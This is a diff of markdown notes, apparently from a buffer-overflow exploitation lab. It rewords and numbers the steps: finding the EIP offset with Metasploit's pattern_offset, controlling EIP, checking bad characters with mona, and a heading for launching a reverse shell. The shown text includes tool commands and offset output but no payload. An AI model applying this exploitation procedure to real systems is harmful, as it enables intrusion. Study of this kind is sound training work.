@@ -8,24 +8,23 @@
 run python3 offset.py
 ```
 
-check on mona where is IP
-Take the EIP address overwritten from mona
-EIP 386F...
+check on mona what is the EIP address
+Take the EIP address that looks EIP 386F...
 
-## 2nd step, pattern create
+## 2nd step : pattern create
 
 ```
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337 (EIP ADDRESS)
 [*] Exact match at offset 2003
 ```
 
-## Control EIP
+## 3rd step : control EIP
 
 edit eipOverwrite.py with the correct offset
 run python3 eipOverwrite.py
 check on Immunity if EIP is well overwritten with 4B4B4B
 
-## Finding bad chars
+## 4th step : finding bad chars
 
 python3 findingBadchars.py
 right click on ESP, follow in dump
@@ -33,7 +32,7 @@ right click on ESP, follow in dump
 !mona compare -f c:\mona\bytearray.bin -a 005FF910(ESP ADDRESS)
 ```
 
-## Fire up the reverse shell
+## 5th step : fire up the reverse shell
 
 We can also create an encoded one if some sort of protections are presents
 ```
